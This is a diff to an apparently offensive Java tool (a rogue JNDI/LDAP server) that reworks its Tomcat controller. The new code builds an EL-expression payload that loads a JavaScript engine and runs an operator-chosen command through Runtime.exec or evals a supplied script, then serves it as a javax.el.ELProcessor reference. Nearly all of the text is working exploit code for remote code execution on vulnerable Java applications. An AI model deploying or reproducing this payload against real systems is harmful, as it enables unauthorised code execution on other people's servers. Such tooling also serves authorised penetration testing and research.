@@ -30,25 +30,32 @@ import static artsploit.Utilities.serialize;
  *  - tomcat-embed-el.jar
  *
  * @author artsploit
+ * @author
  */
 @LdapMapping(uri = { "/o=tomcat" })
 public class Tomcat implements LdapController {
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        String jsPayload;
+        String payload;
 
         if (Config.jsPayloadPath.isEmpty()) {
-            jsPayload = Config.command;
+            System.out.println("Using Config.command payload");
+            payload = ("{" +
+                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
+                    ".newInstance().getEngineByName(\"JavaScript\")" +
+                    ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
+                    "}")
+                    .replace("${command}", makeJavaScriptString(Config.command));
+
         } else {
-            jsPayload = Files.readString(Path.of(Config.jsPayloadPath));
+            System.out.println("Using payload from " + Config.jsPayloadPath);
+            var jsScript = Files.readString(Path.of(Config.jsPayloadPath));
+            payload = ("{" +
+                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
+                    ".newInstance().getEngineByName(\"JavaScript\")" +
+                    ".eval(\"eval(${script})\")" +
+                    "}")
+                    .replace("${script}", makeJavaScriptString(jsScript));
         }
-
-        String payload = ("{" +
-                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
-                ".newInstance().getEngineByName(\"JavaScript\")" +
-                ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
-                "}")
-                .replace("${command}", makeJavaScriptString(jsPayload));
-
 
         System.out.println("Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
 
